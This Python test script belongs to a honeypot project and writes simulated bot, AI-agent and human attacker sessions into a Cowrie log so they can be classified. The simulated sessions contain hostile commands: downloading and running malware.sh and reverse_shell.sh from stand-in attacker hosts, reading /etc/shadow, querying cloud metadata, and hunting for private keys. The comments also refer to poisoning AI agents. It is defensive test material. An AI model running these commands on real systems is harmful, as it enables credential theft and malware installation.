"""
Chameleon Framework - Comprehensive Test Suite
Injects realistic sessions directly into cowrie.json log file
to demonstrate all three tiers without needing Docker/Cowrie running.
"""
import time
import json
import uuid
import random
from datetime import datetime, timezone, timedelta

LOG_FILE = r'd:\Code\FYP\chameleon-framework\honeypot\logs2\cowrie.json'

def ts():
    """Current UTC timestamp in Cowrie format."""
    return datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')

def write_event(event):
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(event) + "\n")

def inject_session_connect(sid, src_ip):
    write_event({
        "eventid": "cowrie.session.connect",
        "session": sid,
        "src_ip": src_ip,
        "src_port": random.randint(40000, 60000),
        "dst_ip": "172.17.0.2",
        "dst_port": 2222,
        "protocol": "ssh",
        "timestamp": ts()
    })

def inject_login(sid, src_ip, user, passwd, success=True):
    write_event({
        "eventid": "cowrie.login.success" if success else "cowrie.login.failed",
        "session": sid,
        "src_ip": src_ip,
        "username": user,
        "password": passwd,
        "timestamp": ts()
    })

def inject_command(sid, src_ip, cmd):
    write_event({
        "eventid": "cowrie.command.input",
        "session": sid,
        "src_ip": src_ip,
        "input": cmd,
        "message": f"CMD: {cmd}",
        "timestamp": ts()
    })

def inject_close(sid, duration_ms):
    write_event({
        "eventid": "cowrie.session.closed",
        "session": sid,
        "duration_ms": duration_ms,
        "timestamp": ts()
    })

# ============================================================
# TEST CASE 1: BOT ATTACK (Tier 1)
# Commands fired with 0ms delay â€” should classify as TIER_1_BOT
# ============================================================
def test_bot_attack():
    sid = uuid.uuid4().hex[:12]
    src_ip = f"45.{random.randint(10,200)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    print(f"\n{'='*60}")
    print(f"  TC-01: BOT ATTACK SIMULATION")
    print(f"  Session: {sid}  |  Source: {src_ip}")
    print(f"{'='*60}")
    
    inject_session_connect(sid, src_ip)
    time.sleep(0.3)
    inject_login(sid, src_ip, "root", "admin123")
    time.sleep(0.2)
    
    # Fire commands with near-zero delay (bot behavior)
    bot_commands = [
        "whoami",
        "cat /etc/shadow",
        "uname -a",
        "wget http://evil.com/malware.sh",
        "chmod +x malware.sh",
        "./malware.sh",
    ]
    
    for cmd in bot_commands:
        inject_command(sid, src_ip, cmd)
        time.sleep(0.05)  # Near-zero delay = BOT
        print(f"  [BOT] â†’ {cmd}")
    
    time.sleep(0.5)
    inject_close(sid, 2500)
    print(f"  âœ“ Session closed. Expected: TIER_1_BOT")
    return sid

# ============================================================
# TEST CASE 2: AI AGENT ATTACK (Tier 2)
# Commands with fixed deterministic delays (~0.5s) → TIER_2_AGENT
# ============================================================
def test_ai_agent_attack():
    sid = uuid.uuid4().hex[:12]
    src_ip = f"185.{random.randint(10,200)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    print(f"\n{'='*60}")
    print(f"  TC-02: AI AGENT ATTACK SIMULATION")
    print(f"  Session: {sid}  |  Source: {src_ip}")
    print(f"{'='*60}")
    
    inject_session_connect(sid, src_ip)
    time.sleep(0.3)
    inject_login(sid, src_ip, "ubuntu", "agent_pass_2026")
    time.sleep(0.2)
    
    agent_commands = [
        "cat /etc/os-release",
        "ls -la /var/www",
        "curl -s http://169.254.169.254/latest/meta-data/",
        "cat credentials.txt",
        "find / -name '*.pem' 2>/dev/null"
    ]
    
    for cmd in agent_commands:
        inject_command(sid, src_ip, cmd)
        time.sleep(0.5) # Deterministic LLM API inference delay -> Tier 2 Agent
        print(f"  [AI AGENT] → {cmd} (fixed 0.5s delay)")
        
    time.sleep(0.5)
    inject_close(sid, 3500)
    print(f"  ✓ Session closed. Expected: TIER_2_AGENT + POISON PAYLOAD DROPPED")
    return sid


# ============================================================
# TEST CASE 3: HUMAN ATTACKER (Tier 3)
# Commands with realistic 2-5 second delays — should classify as TIER_3_HUMAN
# ============================================================
def test_human_attack():
    sid = uuid.uuid4().hex[:12]
    src_ip = f"192.168.{random.randint(1,10)}.{random.randint(100,200)}"
    
    print(f"\n{'='*60}")
    print(f"  TC-03: HUMAN ATTACKER SIMULATION")
    print(f"  Session: {sid}  |  Source: {src_ip}")
    print(f"{'='*60}")
    
    inject_session_connect(sid, src_ip)
    time.sleep(0.5)
    inject_login(sid, src_ip, "admin", "P@ssw0rd!")
    time.sleep(1)
    
    human_commands = [
        ("whoami", 2.5),
        ("ls -la /home", 3.0),
        ("cat /etc/passwd", 2.0),
        ("cat /etc/shadow", 4.0),
        ("wget http://attacker.com/reverse_shell.sh", 3.5),
    ]
    
    for cmd, delay in human_commands:
        inject_command(sid, src_ip, cmd)
        print(f"  [HUMAN] → {cmd}  (waited {delay}s)")
        time.sleep(delay)
    
    time.sleep(1)
    inject_close(sid, 15000)
    print(f"  ✓ Session closed. Expected: TIER_3_HUMAN + GENERATIVE DECEPTION ACTIVE")
    return sid


# ============================================================
# TEST CASE 4: CREDENTIAL ACCESS (Triggers Honeytoken Payload)
# ============================================================
def test_credential_access():
    sid = uuid.uuid4().hex[:12]
    src_ip = f"10.0.{random.randint(1,50)}.{random.randint(1,254)}"
    
    print(f"\n{'='*60}")
    print(f"  TC-04: CREDENTIAL ACCESS / HONEYTOKEN DECEPTION")
    print(f"  Session: {sid}  |  Source: {src_ip}")
    print(f"{'='*60}")
    
    inject_session_connect(sid, src_ip)
    time.sleep(0.5)
    inject_login(sid, src_ip, "root", "toor")
    time.sleep(1)
    
    cred_commands = [
        ("id", 2.0),
        ("cat /etc/shadow", 3.5),
        ("grep password /var/log/auth.log", 3.0),
    ]
    
    for cmd, delay in cred_commands:
        inject_command(sid, src_ip, cmd)
        print(f"  [CRED] → {cmd}  (waited {delay}s)")
        time.sleep(delay)
    
    time.sleep(1)
    inject_close(sid, 8500)
    print(f"  ✓ Session closed. Expected: TIER_3_HUMAN + GENERATIVE_HONEYTOKEN generated")
    return sid


# ============================================================
# TEST CASE 5: DISCOVERY SESSION (Second bot for stats)
# ============================================================
def test_discovery_bot():
    sid = uuid.uuid4().hex[:12]
    src_ip = f"103.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    print(f"\n{'='*60}")
    print(f"  TC-05: DISCOVERY BOT (Mass Scanner)")
    print(f"  Session: {sid}  |  Source: {src_ip}")
    print(f"{'='*60}")
    
    inject_session_connect(sid, src_ip)
    time.sleep(0.3)
    inject_login(sid, src_ip, "root", "123456")
    time.sleep(0.1)
    
    for cmd in ["uname -a", "id", "ifconfig", "netstat -tulpn"]:
        inject_command(sid, src_ip, cmd)
        time.sleep(0.05)
        print(f"  [BOT] → {cmd}")
    
    time.sleep(0.3)
    inject_close(sid, 1200)
    print(f"  ✓ Session closed. Expected: TIER_1_BOT")
    return sid


# ============================================================
# MAIN EXECUTION
# ============================================================
if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("  CHAMELEON FRAMEWORK - FULL TEST SUITE")
    print("  Injecting realistic sessions into cowrie.json")
    print("  Backend must be running at localhost:8000")
    print("  Dashboard must be open at localhost:5173")
    print("=" * 60)
    
    # First, run the fast bots
    test_bot_attack()
    time.sleep(1)
    
    test_discovery_bot()
    time.sleep(1)

    # Run AI agent simulation
    test_ai_agent_attack()
    time.sleep(1)
    
    # Run human sessions
    test_human_attack()
    time.sleep(2)
    
    test_credential_access()
    
    print("\n" + "=" * 60)
    print("  ALL TEST CASES INJECTED SUCCESSFULLY")
    print("  Check the dashboard at http://localhost:5173")
    print("  Expected stats:")
    print("    Active Connections: 0 (all sessions closed)")
    print("    Bots Neutralized: 2+")
    print("    AI Agents Poisoned: 1+")
    print("    Humans Trapped: 2+")
    print("=" * 60)

